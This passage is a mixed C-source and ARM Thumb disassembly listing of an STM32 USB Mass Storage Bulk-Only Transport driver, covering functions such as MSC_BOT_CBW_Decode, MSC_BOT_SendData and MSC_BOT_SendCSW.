 800930e:	68fb      	ldr	r3, [r7, #12]
 8009310:	2200      	movs	r2, #0
 8009312:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 8009314:	68fb      	ldr	r3, [r7, #12]
 8009316:	2201      	movs	r2, #1
 8009318:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 800931a:	4b0d      	ldr	r3, [pc, #52]	; (8009350 <MSC_BOT_Reset+0x60>)
 800931c:	781b      	ldrb	r3, [r3, #0]
 800931e:	4619      	mov	r1, r3
 8009320:	6878      	ldr	r0, [r7, #4]
 8009322:	f003 fcc1 	bl	800cca8 <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 8009326:	4b0b      	ldr	r3, [pc, #44]	; (8009354 <MSC_BOT_Reset+0x64>)
 8009328:	781b      	ldrb	r3, [r3, #0]
 800932a:	4619      	mov	r1, r3
 800932c:	6878      	ldr	r0, [r7, #4]
 800932e:	f003 fcbb 	bl	800cca8 <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009332:	4b08      	ldr	r3, [pc, #32]	; (8009354 <MSC_BOT_Reset+0x64>)
 8009334:	7819      	ldrb	r1, [r3, #0]
 8009336:	68fb      	ldr	r3, [r7, #12]
 8009338:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 800933c:	3210      	adds	r2, #16
 800933e:	231f      	movs	r3, #31
 8009340:	6878      	ldr	r0, [r7, #4]
 8009342:	f003 fd83 	bl	800ce4c <USBD_LL_PrepareReceive>
 8009346:	e000      	b.n	800934a <MSC_BOT_Reset+0x5a>
    return;
 8009348:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800934a:	3710      	adds	r7, #16
 800934c:	46bd      	mov	sp, r7
 800934e:	bd80      	pop	{r7, pc}
 8009350:	2000010a 	.word	0x2000010a
 8009354:	2000010b 	.word	0x2000010b

08009358 <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 8009358:	b480      	push	{r7}
 800935a:	b085      	sub	sp, #20
 800935c:	af00      	add	r7, sp, #0
 800935e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009360:	687b      	ldr	r3, [r7, #4]
 8009362:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009366:	687b      	ldr	r3, [r7, #4]
 8009368:	32b0      	adds	r2, #176	; 0xb0
 800936a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800936e:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 8009370:	68fb      	ldr	r3, [r7, #12]
 8009372:	2b00      	cmp	r3, #0
 8009374:	d002      	beq.n	800937c <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 8009376:	68fb      	ldr	r3, [r7, #12]
 8009378:	2200      	movs	r2, #0
 800937a:	721a      	strb	r2, [r3, #8]
  }
}
 800937c:	bf00      	nop
 800937e:	3714      	adds	r7, #20
 8009380:	46bd      	mov	sp, r7
 8009382:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009386:	4770      	bx	lr

08009388 <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009388:	b580      	push	{r7, lr}
 800938a:	b084      	sub	sp, #16
 800938c:	af00      	add	r7, sp, #0
 800938e:	6078      	str	r0, [r7, #4]
 8009390:	460b      	mov	r3, r1
 8009392:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009394:	687b      	ldr	r3, [r7, #4]
 8009396:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800939a:	687b      	ldr	r3, [r7, #4]
 800939c:	32b0      	adds	r2, #176	; 0xb0
 800939e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80093a2:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 80093a4:	68fb      	ldr	r3, [r7, #12]
 80093a6:	2b00      	cmp	r3, #0
 80093a8:	d022      	beq.n	80093f0 <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 80093aa:	68fb      	ldr	r3, [r7, #12]
 80093ac:	7a1b      	ldrb	r3, [r3, #8]
 80093ae:	2b02      	cmp	r3, #2
 80093b0:	d005      	beq.n	80093be <MSC_BOT_DataIn+0x36>
 80093b2:	2b02      	cmp	r3, #2
 80093b4:	db1e      	blt.n	80093f4 <MSC_BOT_DataIn+0x6c>
 80093b6:	3b03      	subs	r3, #3
 80093b8:	2b01      	cmp	r3, #1
 80093ba:	d81b      	bhi.n	80093f4 <MSC_BOT_DataIn+0x6c>
 80093bc:	e013      	b.n	80093e6 <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80093be:	68fb      	ldr	r3, [r7, #12]
 80093c0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093c4:	7f59      	ldrb	r1, [r3, #29]
 80093c6:	68fb      	ldr	r3, [r7, #12]
 80093c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093cc:	331f      	adds	r3, #31
 80093ce:	461a      	mov	r2, r3
 80093d0:	6878      	ldr	r0, [r7, #4]
 80093d2:	f000 f9e5 	bl	80097a0 <SCSI_ProcessCmd>
 80093d6:	4603      	mov	r3, r0
 80093d8:	2b00      	cmp	r3, #0
 80093da:	da0d      	bge.n	80093f8 <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80093dc:	2101      	movs	r1, #1
 80093de:	6878      	ldr	r0, [r7, #4]
 80093e0:	f000 f920 	bl	8009624 <MSC_BOT_SendCSW>
      }
      break;
 80093e4:	e008      	b.n	80093f8 <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 80093e6:	2100      	movs	r1, #0
 80093e8:	6878      	ldr	r0, [r7, #4]
 80093ea:	f000 f91b 	bl	8009624 <MSC_BOT_SendCSW>
      break;
 80093ee:	e004      	b.n	80093fa <MSC_BOT_DataIn+0x72>
    return;
 80093f0:	bf00      	nop
 80093f2:	e002      	b.n	80093fa <MSC_BOT_DataIn+0x72>

    default:
      break;
 80093f4:	bf00      	nop
 80093f6:	e000      	b.n	80093fa <MSC_BOT_DataIn+0x72>
      break;
 80093f8:	bf00      	nop
  }
}
 80093fa:	3710      	adds	r7, #16
 80093fc:	46bd      	mov	sp, r7
 80093fe:	bd80      	pop	{r7, pc}

08009400 <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009400:	b580      	push	{r7, lr}
 8009402:	b084      	sub	sp, #16
 8009404:	af00      	add	r7, sp, #0
 8009406:	6078      	str	r0, [r7, #4]
 8009408:	460b      	mov	r3, r1
 800940a:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800940c:	687b      	ldr	r3, [r7, #4]
 800940e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009412:	687b      	ldr	r3, [r7, #4]
 8009414:	32b0      	adds	r2, #176	; 0xb0
 8009416:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800941a:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800941c:	68fb      	ldr	r3, [r7, #12]
 800941e:	2b00      	cmp	r3, #0
 8009420:	d01e      	beq.n	8009460 <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 8009422:	68fb      	ldr	r3, [r7, #12]
 8009424:	7a1b      	ldrb	r3, [r3, #8]
 8009426:	2b00      	cmp	r3, #0
 8009428:	d002      	beq.n	8009430 <MSC_BOT_DataOut+0x30>
 800942a:	2b01      	cmp	r3, #1
 800942c:	d004      	beq.n	8009438 <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 800942e:	e01a      	b.n	8009466 <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 8009430:	6878      	ldr	r0, [r7, #4]
 8009432:	f000 f81b 	bl	800946c <MSC_BOT_CBW_Decode>
      break;
 8009436:	e016      	b.n	8009466 <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009438:	68fb      	ldr	r3, [r7, #12]
 800943a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800943e:	7f59      	ldrb	r1, [r3, #29]
 8009440:	68fb      	ldr	r3, [r7, #12]
 8009442:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009446:	331f      	adds	r3, #31
 8009448:	461a      	mov	r2, r3
 800944a:	6878      	ldr	r0, [r7, #4]
 800944c:	f000 f9a8 	bl	80097a0 <SCSI_ProcessCmd>
 8009450:	4603      	mov	r3, r0
 8009452:	2b00      	cmp	r3, #0
 8009454:	da06      	bge.n	8009464 <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009456:	2101      	movs	r1, #1
 8009458:	6878      	ldr	r0, [r7, #4]
 800945a:	f000 f8e3 	bl	8009624 <MSC_BOT_SendCSW>
      break;
 800945e:	e001      	b.n	8009464 <MSC_BOT_DataOut+0x64>
    return;
 8009460:	bf00      	nop
 8009462:	e000      	b.n	8009466 <MSC_BOT_DataOut+0x66>
      break;
 8009464:	bf00      	nop
  }
}
 8009466:	3710      	adds	r7, #16
 8009468:	46bd      	mov	sp, r7
 800946a:	bd80      	pop	{r7, pc}

0800946c <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 800946c:	b580      	push	{r7, lr}
 800946e:	b084      	sub	sp, #16
 8009470:	af00      	add	r7, sp, #0
 8009472:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009474:	687b      	ldr	r3, [r7, #4]
 8009476:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800947a:	687b      	ldr	r3, [r7, #4]
 800947c:	32b0      	adds	r2, #176	; 0xb0
 800947e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009482:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009484:	68fb      	ldr	r3, [r7, #12]
 8009486:	2b00      	cmp	r3, #0
 8009488:	f000 8085 	beq.w	8009596 <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 800948c:	68fb      	ldr	r3, [r7, #12]
 800948e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009492:	695b      	ldr	r3, [r3, #20]
 8009494:	68fa      	ldr	r2, [r7, #12]
 8009496:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800949a:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 800949c:	68fb      	ldr	r3, [r7, #12]
 800949e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094a2:	699b      	ldr	r3, [r3, #24]
 80094a4:	68fa      	ldr	r2, [r7, #12]
 80094a6:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80094aa:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80094ac:	4b3d      	ldr	r3, [pc, #244]	; (80095a4 <MSC_BOT_CBW_Decode+0x138>)
 80094ae:	781b      	ldrb	r3, [r3, #0]
 80094b0:	4619      	mov	r1, r3
 80094b2:	6878      	ldr	r0, [r7, #4]
 80094b4:	f003 fd02 	bl	800cebc <USBD_LL_GetRxDataSize>
 80094b8:	4603      	mov	r3, r0
 80094ba:	2b1f      	cmp	r3, #31
 80094bc:	d118      	bne.n	80094f0 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80094be:	68fb      	ldr	r3, [r7, #12]
 80094c0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094c4:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80094c6:	4a38      	ldr	r2, [pc, #224]	; (80095a8 <MSC_BOT_CBW_Decode+0x13c>)
 80094c8:	4293      	cmp	r3, r2
 80094ca:	d111      	bne.n	80094f0 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80094cc:	68fb      	ldr	r3, [r7, #12]
 80094ce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094d2:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80094d4:	2b01      	cmp	r3, #1
 80094d6:	d80b      	bhi.n	80094f0 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80094d8:	68fb      	ldr	r3, [r7, #12]
 80094da:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094de:	7f9b      	ldrb	r3, [r3, #30]
 80094e0:	2b00      	cmp	r3, #0
 80094e2:	d005      	beq.n	80094f0 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 80094e4:	68fb      	ldr	r3, [r7, #12]
 80094e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094ea:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80094ec:	2b10      	cmp	r3, #16
 80094ee:	d90f      	bls.n	8009510 <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 80094f0:	68fb      	ldr	r3, [r7, #12]
 80094f2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094f6:	7f59      	ldrb	r1, [r3, #29]
 80094f8:	2320      	movs	r3, #32
 80094fa:	2205      	movs	r2, #5
 80094fc:	6878      	ldr	r0, [r7, #4]
 80094fe:	f000 fe7b 	bl	800a1f8 <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009502:	68fb      	ldr	r3, [r7, #12]
 8009504:	2202      	movs	r2, #2
 8009506:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 8009508:	6878      	ldr	r0, [r7, #4]
 800950a:	f000 f8cb 	bl	80096a4 <MSC_BOT_Abort>
 800950e:	e045      	b.n	800959c <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009510:	68fb      	ldr	r3, [r7, #12]
 8009512:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009516:	7f59      	ldrb	r1, [r3, #29]
 8009518:	68fb      	ldr	r3, [r7, #12]
 800951a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800951e:	331f      	adds	r3, #31
 8009520:	461a      	mov	r2, r3
 8009522:	6878      	ldr	r0, [r7, #4]
 8009524:	f000 f93c 	bl	80097a0 <SCSI_ProcessCmd>
 8009528:	4603      	mov	r3, r0
 800952a:	2b00      	cmp	r3, #0
 800952c:	da0c      	bge.n	8009548 <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 800952e:	68fb      	ldr	r3, [r7, #12]
 8009530:	7a1b      	ldrb	r3, [r3, #8]
 8009532:	2b05      	cmp	r3, #5
 8009534:	d104      	bne.n	8009540 <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009536:	2101      	movs	r1, #1
 8009538:	6878      	ldr	r0, [r7, #4]
 800953a:	f000 f873 	bl	8009624 <MSC_BOT_SendCSW>
 800953e:	e02d      	b.n	800959c <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 8009540:	6878      	ldr	r0, [r7, #4]
 8009542:	f000 f8af 	bl	80096a4 <MSC_BOT_Abort>
 8009546:	e029      	b.n	800959c <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009548:	68fb      	ldr	r3, [r7, #12]
 800954a:	7a1b      	ldrb	r3, [r3, #8]
 800954c:	2b02      	cmp	r3, #2
 800954e:	d024      	beq.n	800959a <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 8009550:	68fb      	ldr	r3, [r7, #12]
 8009552:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009554:	2b01      	cmp	r3, #1
 8009556:	d020      	beq.n	800959a <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 8009558:	68fb      	ldr	r3, [r7, #12]
 800955a:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 800955c:	2b03      	cmp	r3, #3
 800955e:	d01c      	beq.n	800959a <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 8009560:	68fb      	ldr	r3, [r7, #12]
 8009562:	68db      	ldr	r3, [r3, #12]
 8009564:	2b00      	cmp	r3, #0
 8009566:	d009      	beq.n	800957c <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 8009568:	68fb      	ldr	r3, [r7, #12]
 800956a:	f103 0110 	add.w	r1, r3, #16
 800956e:	68fb      	ldr	r3, [r7, #12]
 8009570:	68db      	ldr	r3, [r3, #12]
 8009572:	461a      	mov	r2, r3
 8009574:	6878      	ldr	r0, [r7, #4]
 8009576:	f000 f819 	bl	80095ac <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 800957a:	e00f      	b.n	800959c <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 800957c:	68fb      	ldr	r3, [r7, #12]
 800957e:	68db      	ldr	r3, [r3, #12]
 8009580:	2b00      	cmp	r3, #0
 8009582:	d104      	bne.n	800958e <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009584:	2100      	movs	r1, #0
 8009586:	6878      	ldr	r0, [r7, #4]
 8009588:	f000 f84c 	bl	8009624 <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 800958c:	e006      	b.n	800959c <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 800958e:	6878      	ldr	r0, [r7, #4]
 8009590:	f000 f888 	bl	80096a4 <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 8009594:	e002      	b.n	800959c <MSC_BOT_CBW_Decode+0x130>
    return;
 8009596:	bf00      	nop
 8009598:	e000      	b.n	800959c <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 800959a:	bf00      	nop
    }
  }
}
 800959c:	3710      	adds	r7, #16
 800959e:	46bd      	mov	sp, r7
 80095a0:	bd80      	pop	{r7, pc}
 80095a2:	bf00      	nop
 80095a4:	2000010b 	.word	0x2000010b
 80095a8:	43425355 	.word	0x43425355

080095ac <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 80095ac:	b580      	push	{r7, lr}
 80095ae:	b086      	sub	sp, #24
 80095b0:	af00      	add	r7, sp, #0
 80095b2:	60f8      	str	r0, [r7, #12]
 80095b4:	60b9      	str	r1, [r7, #8]
 80095b6:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80095b8:	68fb      	ldr	r3, [r7, #12]
 80095ba:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80095be:	68fb      	ldr	r3, [r7, #12]
 80095c0:	32b0      	adds	r2, #176	; 0xb0
 80095c2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80095c6:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80095c8:	697b      	ldr	r3, [r7, #20]
 80095ca:	2b00      	cmp	r3, #0
 80095cc:	d023      	beq.n	8009616 <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 80095ce:	697b      	ldr	r3, [r7, #20]
 80095d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095d4:	699b      	ldr	r3, [r3, #24]
 80095d6:	687a      	ldr	r2, [r7, #4]
 80095d8:	4293      	cmp	r3, r2
 80095da:	bf28      	it	cs
 80095dc:	4613      	movcs	r3, r2
 80095de:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 80095e0:	697b      	ldr	r3, [r7, #20]
 80095e2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095e6:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 80095e8:	687b      	ldr	r3, [r7, #4]
 80095ea:	1ad3      	subs	r3, r2, r3
 80095ec:	697a      	ldr	r2, [r7, #20]
 80095ee:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80095f2:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 80095f4:	697b      	ldr	r3, [r7, #20]
 80095f6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095fa:	2200      	movs	r2, #0
 80095fc:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 8009600:	697b      	ldr	r3, [r7, #20]
 8009602:	2204      	movs	r2, #4
 8009604:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 8009606:	4b06      	ldr	r3, [pc, #24]	; (8009620 <MSC_BOT_SendData+0x74>)
 8009608:	7819      	ldrb	r1, [r3, #0]
 800960a:	693b      	ldr	r3, [r7, #16]
 800960c:	68ba      	ldr	r2, [r7, #8]
 800960e:	68f8      	ldr	r0, [r7, #12]
 8009610:	f003 fbe4 	bl	800cddc <USBD_LL_Transmit>
 8009614:	e000      	b.n	8009618 <MSC_BOT_SendData+0x6c>
    return;
 8009616:	bf00      	nop
}
 8009618:	3718      	adds	r7, #24
 800961a:	46bd      	mov	sp, r7
 800961c:	bd80      	pop	{r7, pc}
 800961e:	bf00      	nop
 8009620:	2000010a 	.word	0x2000010a

08009624 <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 8009624:	b580      	push	{r7, lr}
 8009626:	b084      	sub	sp, #16
 8009628:	af00      	add	r7, sp, #0
 800962a:	6078      	str	r0, [r7, #4]
 800962c:	460b      	mov	r3, r1
 800962e:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009630:	687b      	ldr	r3, [r7, #4]
 8009632:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009636:	687b      	ldr	r3, [r7, #4]
 8009638:	32b0      	adds	r2, #176	; 0xb0
 800963a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800963e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009640:	68fb      	ldr	r3, [r7, #12]
 8009642:	2b00      	cmp	r3, #0
 8009644:	d024      	beq.n	8009690 <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 8009646:	68fb      	ldr	r3, [r7, #12]
 8009648:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800964c:	461a      	mov	r2, r3
 800964e:	4b12      	ldr	r3, [pc, #72]	; (8009698 <MSC_BOT_SendCSW+0x74>)
 8009650:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 8009652:	68fb      	ldr	r3, [r7, #12]
 8009654:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009658:	461a      	mov	r2, r3
 800965a:	78fb      	ldrb	r3, [r7, #3]
 800965c:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 8009660:	68fb      	ldr	r3, [r7, #12]
 8009662:	2200      	movs	r2, #0
 8009664:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 8009666:	4b0d      	ldr	r3, [pc, #52]	; (800969c <MSC_BOT_SendCSW+0x78>)
 8009668:	7819      	ldrb	r1, [r3, #0]
 800966a:	68fb      	ldr	r3, [r7, #12]
 800966c:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 8009670:	3210      	adds	r2, #16
 8009672:	230d      	movs	r3, #13
 8009674:	6878      	ldr	r0, [r7, #4]
 8009676:	f003 fbb1 	bl	800cddc <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 800967a:	4b09      	ldr	r3, [pc, #36]	; (80096a0 <MSC_BOT_SendCSW+0x7c>)
 800967c:	7819      	ldrb	r1, [r3, #0]
 800967e:	68fb      	ldr	r3, [r7, #12]
 8009680:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009684:	3210      	adds	r2, #16
 8009686:	231f      	movs	r3, #31
 8009688:	6878      	ldr	r0, [r7, #4]
 800968a:	f003 fbdf 	bl	800ce4c <USBD_LL_PrepareReceive>
 800968e:	e000      	b.n	8009692 <MSC_BOT_SendCSW+0x6e>
    return;
 8009690:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009692:	3710      	adds	r7, #16
 8009694:	46bd      	mov	sp, r7
 8009696:	bd80      	pop	{r7, pc}
 8009698:	53425355 	.word	0x53425355
 800969c:	2000010a 	.word	0x2000010a
 80096a0:	2000010b 	.word	0x2000010b

080096a4 <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 80096a4:	b580      	push	{r7, lr}
 80096a6:	b084      	sub	sp, #16
 80096a8:	af00      	add	r7, sp, #0
 80096aa:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80096ac:	687b      	ldr	r3, [r7, #4]
